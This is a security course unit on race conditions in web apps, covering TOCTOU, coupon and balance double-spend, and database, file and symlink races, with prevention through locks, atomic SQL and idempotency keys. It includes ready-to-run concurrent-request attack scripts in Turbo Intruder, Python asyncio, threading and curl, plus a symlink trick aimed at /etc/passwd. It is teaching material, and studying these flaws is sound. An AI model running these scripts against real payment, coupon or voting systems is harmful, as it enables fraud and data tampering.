# Unit 10: Other Web Vulnerabilities - Topic 6: Race Conditions

## Overview

Race conditions occur when the outcome of a process depends on the sequence or timing of uncontrollable events, such as the order in which threads or requests execute. In web applications, race conditions arise when multiple concurrent requests access and modify shared resources (database records, files, memory) simultaneously, leading to unexpected and exploitable behavior. These vulnerabilities can result in **financial fraud**, **authentication bypass**, **data corruption**, and **privilege escalation**.

---

## 1. Race Condition Fundamentals

### Time-of-Check to Time-of-Use (TOCTOU)

```
TOCTOU Vulnerability:

Thread/Request A:                    Thread/Request B:
┌────────────────────┐
│ 1. CHECK: balance  │
│    = $100 ✓        │
│                    │               ┌────────────────────┐
│                    │               │ 1. CHECK: balance  │
│                    │               │    = $100 ✓        │
│ 2. USE: withdraw   │               │                    │
│    $100            │               │ 2. USE: withdraw   │
│    balance = $0    │               │    $100            │
└────────────────────┘               │    balance = $0    │
                                     └────────────────────┘

Result: $200 withdrawn from $100 balance!

The GAP between CHECK and USE is the race window.
Both threads see $100, both withdraw $100.
```

### Race Condition in Web Context

```
Normal Sequential Processing:
Request 1: Check → Deduct → Complete  ──► Request 2: Check → Deduct → Complete
Balance:   $100  →  $0    → Done           $0    → Denied

Race Condition (Concurrent):
Request 1: Check ($100) ─────────────── Deduct → Complete
Request 2: Check ($100) ─────────────── Deduct → Complete
                   ↑                         ↑
              Both see $100            Both deduct $100
              
Result: -$100 balance (overdraft!)
```

### Types of Race Conditions in Web Apps

| Type | Description | Example |
|------|-------------|---------|
| **Limit Overrun** | Exceed usage limits | Use coupon twice |
| **Double Spend** | Spend same resource twice | Withdraw same balance |
| **TOCTOU** | Check/use timing gap | File access races |
| **Database Race** | Concurrent DB operations | Counter increment |
| **File Race** | Concurrent file access | Upload + access |
| **Session Race** | Concurrent session ops | Login state races |

---

## 2. Limit-Overrun Attacks

### Coupon/Discount Race Condition

```
Vulnerable Code (Python/Flask):

@app.route('/apply-coupon', methods=['POST'])
def apply_coupon():
    coupon = Coupon.query.filter_by(code=request.json['code']).first()
    
    # CHECK: Is coupon still valid?
    if coupon.used:                    # ◄── Time of Check
        return "Coupon already used", 400
    
    # ... some processing time ...
    
    # USE: Apply discount and mark used
    order.total -= coupon.discount     # ◄── Time of Use  
    coupon.used = True                 # (RACE WINDOW between check and use!)
    db.session.commit()

# If two requests arrive simultaneously:
# Request 1: coupon.used = False ✓ → apply discount → set used = True
# Request 2: coupon.used = False ✓ → apply discount → set used = True
# Both succeed! Coupon used twice!
```

### Vote/Like Manipulation

```
Vulnerable Code:

@app.route('/vote', methods=['POST'])
def vote():
    user_id = session['user_id']
    post_id = request.json['post_id']
    
    # CHECK: Has user already voted?
    existing = Vote.query.filter_by(
        user_id=user_id, post_id=post_id
    ).first()
    
    if existing:
        return "Already voted", 400
    
    # USE: Create vote (RACE WINDOW!)
    vote = Vote(user_id=user_id, post_id=post_id)
    db.session.add(vote)
    
    # Increment counter
    post = Post.query.get(post_id)
    post.vote_count += 1
    db.session.commit()

# Send 100 simultaneous requests → 100 votes instead of 1
```

### Account Balance / Financial Races

```
Vulnerable Code:

def transfer(from_account, to_account, amount):
    # CHECK balance
    sender = Account.query.get(from_account)
    if sender.balance < amount:        # Time of Check
        return "Insufficient funds"
    
    # Processing delay...
    
    # USE balance
    sender.balance -= amount           # Time of Use
    receiver = Account.query.get(to_account)
    receiver.balance += amount
    db.session.commit()

# Attack: Send multiple $100 transfers simultaneously
# from account with $100 balance
# All checks pass (balance = $100 > $100)
# All transfers execute (balance goes negative)
```

---

## 3. Exploitation Techniques

### Using Burp Suite Turbo Intruder

```python
# Turbo Intruder Script - Race Condition
# Use "single-packet attack" for precise timing

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,      # Single connection
        requestsPerConnection=100,    # Pipeline requests
        pipeline=True                 # HTTP pipelining
    )
    
    # Queue all requests behind a gate
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # Release all requests simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Single-Packet Attack (HTTP/2)

```
The Single-Packet Attack leverages HTTP/2 multiplexing
to send multiple requests in a SINGLE TCP packet:

┌────────────────────────────────┐
│ Single TCP Packet              │
│ ┌────────────┐ ┌────────────┐ │
│ │ Request 1  │ │ Request 2  │ │
│ │ /redeem    │ │ /redeem    │ │
│ │ coupon=X   │ │ coupon=X   │ │
│ └────────────┘ └────────────┘ │
│ ┌────────────┐ ┌────────────┐ │
│ │ Request 3  │ │ Request N  │ │
│ │ /redeem    │ │ /redeem    │ │
│ │ coupon=X   │ │ coupon=X   │ │
│ └────────────┘ └────────────┘ │
└────────────────────────────────┘
          │
          ▼ Server processes all simultaneously
    
Advantages:
- No network jitter (all in one packet)
- Maximum timing precision
- Works even with strict rate limiting
- Bypasses load balancer distribution

# Turbo Intruder with HTTP/2 single-packet attack
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=1,
    engine=Engine.HTTP2  # Use HTTP/2
)
```

### Using Python for Race Conditions

```python
import asyncio
import aiohttp
import time

async def send_request(session, url, data, headers):
    async with session.post(url, json=data, headers=headers) as response:
        status = response.status
        text = await response.text()
        return {"status": status, "body": text}

async def race_condition_test():
    url = "http://target.com/api/apply-coupon"
    data = {"code": "SAVE50"}
    headers = {"Cookie": "session=abc123"}
    
    async with aiohttp.ClientSession() as session:
        # Create many concurrent requests
        tasks = [
            send_request(session, url, data, headers)
            for _ in range(50)
        ]
        
        # Execute all simultaneously
        results = await asyncio.gather(*tasks)
        
        # Analyze results
        successes = [r for r in results if r['status'] == 200]
        print(f"Successful applications: {len(successes)}")
        print(f"Expected: 1, Got: {len(successes)}")

asyncio.run(race_condition_test())
```

### Using Threading (Python)

```python
import threading
import requests

TARGET = "http://target.com/api/transfer"
HEADERS = {"Cookie": "session=abc123"}
RESULTS = []

def send_transfer():
    data = {"to": "attacker_account", "amount": 100}
    resp = requests.post(TARGET, json=data, headers=HEADERS)
    RESULTS.append(resp.status_code)

# Create threads
threads = []
for i in range(20):
    t = threading.Thread(target=send_transfer)
    threads.append(t)

# Start all threads as close together as possible
barrier = threading.Barrier(20)

def send_with_barrier():
    barrier.wait()  # Wait for all threads
    send_transfer()

threads = [threading.Thread(target=send_with_barrier) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

print(f"Results: {RESULTS}")
print(f"Successes: {RESULTS.count(200)}")
```

### Using curl for Quick Testing

```bash
# Send parallel requests with GNU parallel
seq 1 20 | parallel -j20 \
  "curl -s -o /dev/null -w '%{http_code}\n' \
   -X POST http://target.com/api/redeem \
   -H 'Cookie: session=abc123' \
   -d '{\"code\":\"SAVE50\"}'"

# Using bash background processes
for i in $(seq 1 20); do
    curl -s -X POST http://target.com/api/redeem \
      -H "Cookie: session=abc123" \
      -d '{"code":"SAVE50"}' &
done
wait

# Using xargs for parallelism
seq 1 20 | xargs -P20 -I{} \
  curl -s -X POST http://target.com/api/vote \
  -H "Cookie: session=abc123" \
  -d '{"post_id":"1001"}'
```

---

## 4. Database-Level Race Conditions

### Lost Update Problem

```sql
-- Transaction A and Transaction B read the same row
-- Both update it, but one update is lost

-- Transaction A:
BEGIN;
SELECT balance FROM accounts WHERE id = 1;  -- Returns 100
-- Balance is 100, withdraw 50
UPDATE accounts SET balance = 50 WHERE id = 1;
COMMIT;

-- Transaction B (concurrent):
BEGIN;
SELECT balance FROM accounts WHERE id = 1;  -- Also returns 100!
-- Balance is 100, withdraw 75
UPDATE accounts SET balance = 25 WHERE id = 1;
COMMIT;

-- Final balance: 25 (should be -25 or denied!)
-- Transaction A's update was lost
```

### Counter Increment Race

```sql
-- Vulnerable: Read-modify-write is not atomic
-- Thread 1:
SELECT view_count FROM posts WHERE id = 1;  -- Returns 100
UPDATE posts SET view_count = 101 WHERE id = 1;

-- Thread 2 (concurrent):
SELECT view_count FROM posts WHERE id = 1;  -- Also returns 100!
UPDATE posts SET view_count = 101 WHERE id = 1;

-- Both set to 101, should be 102!

-- FIX: Use atomic increment
UPDATE posts SET view_count = view_count + 1 WHERE id = 1;
-- This is atomic and thread-safe
```

### Database Locking Strategies

| Strategy | SQL Example | Use Case |
|----------|-------------|----------|
| **Pessimistic Lock** | `SELECT ... FOR UPDATE` | High contention, financial |
| **Optimistic Lock** | Check version on update | Low contention, reads > writes |
| **Atomic Update** | `SET x = x + 1` | Simple increments |
| **Serializable Isolation** | `SET TRANSACTION ISOLATION LEVEL SERIALIZABLE` | Strictest |
| **Advisory Lock** | `SELECT pg_advisory_lock(id)` | Custom locking |

---

## 5. File-Based Race Conditions

### Upload Race Condition

```
Attack: Upload malicious file + access before deletion

Timeline:
──────────────────────────────────────────────────►
    │            │              │           │
    ▼            ▼              ▼           ▼
 Upload       File saved    Validation   Delete
 request      to disk       starts       bad file
              │                          │
              └──── RACE WINDOW ─────────┘
              Access file HERE!

# Turbo Intruder approach:
# Send upload + access requests simultaneously
```

### Temp File Race

```python
# Vulnerable: Predictable temp file name
import tempfile

def process_upload(file_data):
    # Create temp file with predictable name
    temp_path = f"/tmp/upload_{session_id}"
    
    with open(temp_path, 'wb') as f:
        f.write(file_data)
    
    # Process file (virus scan, validation, etc.)
    result = validate(temp_path)
    
    # Delete temp file
    os.remove(temp_path)
    
    return result

# Attack: Symlink race
# Before upload: ln -s /etc/passwd /tmp/upload_known_session_id
# App writes uploaded data to /etc/passwd via symlink!
```

---

## 6. Real-World Race Condition Examples

### Example 1: Starbucks Gift Card Race

```
Discovery: Researcher Egor Homakov
1. Load two browser tabs with gift card transfer page
2. Set both to transfer full balance ($20) to second card
3. Click "Transfer" in both tabs simultaneously
4. Both transfers succeed
5. Second card now has $40 (doubled!)
6. Repeat to multiply balance indefinitely

Root Cause: No database-level locking on balance check/deduct
Impact: Unlimited store credit
```

### Example 2: E-Commerce Coupon Race

```
Discovery: Bug bounty program
1. Valid coupon: "HALFOFF" (50% discount, single use)
2. Send 10 simultaneous /apply-coupon requests
3. Server checks "used" flag: all 10 see "false"
4. All 10 apply the discount
5. Some servers: 10 × 50% = 500% discount = free + refund!

Root Cause: Read-check-write not atomic
Impact: Financial loss
```

### Example 3: GitHub Rate Limit Race

```
Discovery: Security researcher
1. GitHub enforced invite limits per repository
2. By sending multiple invitation requests simultaneously
3. More invitations were sent than the allowed limit
4. Race condition in limit checking code

Root Cause: Counter check and increment not atomic
```

---

## 7. Detection and Testing Methodology

### Identifying Race-Prone Functionality

```
High-Risk Features for Race Conditions:
┌──────────────────────────────────────┐
│ ✓ Financial transactions             │
│ ✓ Coupon/voucher redemption          │
│ ✓ Vote/like/rating systems           │
│ ✓ Account balance operations         │
│ ✓ Inventory management              │
│ ✓ Token/invite generation            │
│ ✓ File upload processing             │
│ ✓ Registration (unique constraints)  │
│ ✓ Session management                 │
│ ✓ Any "one-time" operation           │
│ ✓ Counter increments                 │
│ ✓ Limit enforcement                  │
└──────────────────────────────────────┘
```

### Testing Methodology

```
Step 1: Identify target endpoint
        (single-use coupon, balance transfer, etc.)

Step 2: Understand the expected behavior
        (what should happen with concurrent requests?)

Step 3: Send concurrent requests
        - Turbo Intruder (single-packet attack)
        - Python asyncio
        - GNU parallel + curl

Step 4: Analyze results
        - Count successful responses (should be 1, got N?)
        - Check database state (balance, counters, records)
        - Compare expected vs actual outcome

Step 5: Vary timing
        - Different concurrency levels (5, 10, 20, 50)
        - Add small delays between some requests
        - Try HTTP/1.1 pipelining vs HTTP/2 multiplexing

Step 6: Document and report
        - Include reproduction steps
        - Show financial/business impact
        - Suggest fixes
```

### Burp Suite Race Condition Testing

```
Method 1: Turbo Intruder Extension
  1. Right-click request → Send to Turbo Intruder
  2. Use race condition template
  3. Set gate for synchronized release
  4. Analyze responses

Method 2: Repeater with "Send group in parallel" (Burp 2023+)
  1. Send request to Repeater
  2. Duplicate tab 10-20 times
  3. Select all tabs
  4. Right-click → "Send group in parallel (single-packet attack)"
  5. Compare responses

Method 3: Intruder with Null Payloads
  1. Set payload position to null
  2. Generate N null payloads
  3. Set concurrent threads to maximum
  4. Run and analyze
```

---

## 8. Prevention Techniques

### Database-Level Prevention

```sql
-- 1. Pessimistic Locking (SELECT FOR UPDATE)
BEGIN;
SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;
-- Row is now locked - other transactions wait
UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance >= 100;
COMMIT;

-- 2. Optimistic Locking (Version column)
-- Add version column to table
ALTER TABLE accounts ADD COLUMN version INT DEFAULT 0;

-- Read with version
SELECT balance, version FROM accounts WHERE id = 1;
-- Returns: balance=100, version=5

-- Update only if version matches
UPDATE accounts 
SET balance = balance - 100, version = version + 1 
WHERE id = 1 AND version = 5;
-- If 0 rows affected → another transaction modified it → retry

-- 3. Atomic Operations
-- Use atomic updates instead of read-modify-write
UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance >= 100;
-- Single SQL statement = atomic

-- 4. Unique Constraints
-- Prevent duplicate entries
CREATE UNIQUE INDEX idx_votes ON votes(user_id, post_id);
-- Database rejects duplicates even in race condition

-- 5. Serializable Isolation Level
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;
-- Strictest isolation - prevents all race conditions
-- But has performance impact
```

### Application-Level Prevention

```python
# 1. Distributed Locking (Redis)
import redis

r = redis.Redis()

def apply_coupon_safe(coupon_code, order_id):
    lock_key = f"coupon_lock:{coupon_code}"
    
    # Acquire lock with timeout
    lock = r.lock(lock_key, timeout=10, blocking_timeout=5)
    
    if lock.acquire():
        try:
            coupon = get_coupon(coupon_code)
            if coupon.used:
                return "Coupon already used"
            
            apply_discount(order_id, coupon.discount)
            coupon.used = True
            save_coupon(coupon)
            return "Coupon applied"
        finally:
            lock.release()
    else:
        return "Please try again"

# 2. Idempotency Keys
@app.route('/api/transfer', methods=['POST'])
def transfer():
    idempotency_key = request.headers.get('Idempotency-Key')
    
    # Check if this request was already processed
    existing = ProcessedRequest.query.filter_by(
        key=idempotency_key
    ).first()
    
    if existing:
        return existing.response  # Return cached response
    
    # Process transfer
    result = process_transfer(request.json)
    
    # Store result with idempotency key
    ProcessedRequest.create(
        key=idempotency_key,
        response=result
    )
    
    return result

# 3. Token-Based Single Use
import secrets

def generate_action_token(action, user_id):
    token = secrets.token_urlsafe(32)
    redis.setex(f"action:{token}", 300, f"{action}:{user_id}")
    return token

def consume_action_token(token):
    # GETDEL is atomic - get and delete in one operation
    data = redis.getdel(f"action:{token}")
    if data is None:
        raise ValueError("Invalid or expired token")
    return data
```

### Prevention Strategy Comparison

| Strategy | Pros | Cons | Best For |
|----------|------|------|----------|
| **Pessimistic Lock** | Strong guarantee | Blocks concurrent access | Financial ops |
| **Optimistic Lock** | Better performance | Requires retry logic | Low contention |
| **Atomic SQL** | Simple, fast | Limited to simple ops | Counters, balance |
| **Unique Constraints** | Database-enforced | Only for uniqueness | Votes, registrations |
| **Redis Lock** | Distributed | Additional infrastructure | Microservices |
| **Idempotency Keys** | Client-controlled | Requires client cooperation | API operations |
| **Serializable TX** | Complete protection | Performance impact | Critical operations |
| **Queue Processing** | Eliminates concurrency | Adds latency | Order processing |

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **TOCTOU** | Gap between checking and using a value allows exploitation |
| **Limit Overrun** | Exceed single-use limits by concurrent requests |
| **Double Spend** | Spend same resource twice via simultaneous requests |
| **Single-Packet Attack** | HTTP/2 multiplexing sends all requests in one packet |
| **Turbo Intruder** | Burp extension for precise race condition testing |
| **Database Races** | Lost updates when read-modify-write is not atomic |
| **File Races** | Access uploaded file before validation/deletion |
| **Prevention** | Atomic operations, locks, unique constraints, idempotency |

---

## Revision Questions

1. Explain the TOCTOU (Time-of-Check to Time-of-Use) vulnerability pattern. Why is the gap between check and use dangerous?
2. What is the "single-packet attack" technique and why is it more effective than sending individual requests for race condition testing?
3. Describe a limit-overrun attack on a coupon redemption system. How would you exploit it and how would you fix it?
4. Compare pessimistic locking and optimistic locking. When would you choose each approach?
5. How do database unique constraints help prevent race conditions? Give an example with a voting system.
6. Design a race-condition-proof money transfer system. What layers of protection would you implement?

---

*Previous: [05-business-logic-flaws.md](05-business-logic-flaws.md)*

---

*[Back to README](../README.md)*
